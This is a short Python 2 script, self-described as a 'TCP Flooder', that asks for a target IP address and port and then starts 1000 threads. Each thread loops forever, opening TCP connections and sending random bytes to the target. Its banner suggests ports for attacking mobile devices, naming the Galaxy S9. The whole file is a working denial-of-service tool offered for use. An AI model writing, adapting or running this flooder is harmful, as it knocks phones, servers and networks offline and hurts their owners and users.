import socket
import random
import time
from threading import Thread
import threading
import bcolors
import pyfiglet
import time
import os

ascii_banner = pyfiglet.figlet_format("POTOP")
print(bcolors.BOLD + bcolors.HEADER + ascii_banner)
print("TCP Flooder made by: xxSlothAIxx")
print("=======================================================")
print(bcolors.BOLD + "PORT OPTIONS")
print("Port 6 for most mobile devices")
print("Port 80 for http on local network")
print("ALL PORTS WORK for galaxy S9")
print("=======================================================")
print("\n")

data = random._urandom(16)

ip = raw_input("Enter your ip: ")
port = raw_input("Enter PORT:")

socket_threads = []

class SocketThread(Thread):

	def __init__(self, ip, port):
		Thread.__init__(self)
		self.ip = ip
		self.port = port

	def run(self):
		while True:
			try:
				server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				server.connect((ip, int(port)))
				for x in range(0, 100):
					server.send(data)
				print('[*] TCP TCP TCP CONNECTED %s' % self.ip)
			except socket.error:
				server.close()
				print('[*] Error TCP ')

#created 1000 threads (Anything over 1000 returns errors)

for _ in range(0, 1000):
	sthread = SocketThread(ip, port)
	sthread.start()
	socket_threads.append(sthread)

for socket_thread in socket_threads:
	socket_thread.join()
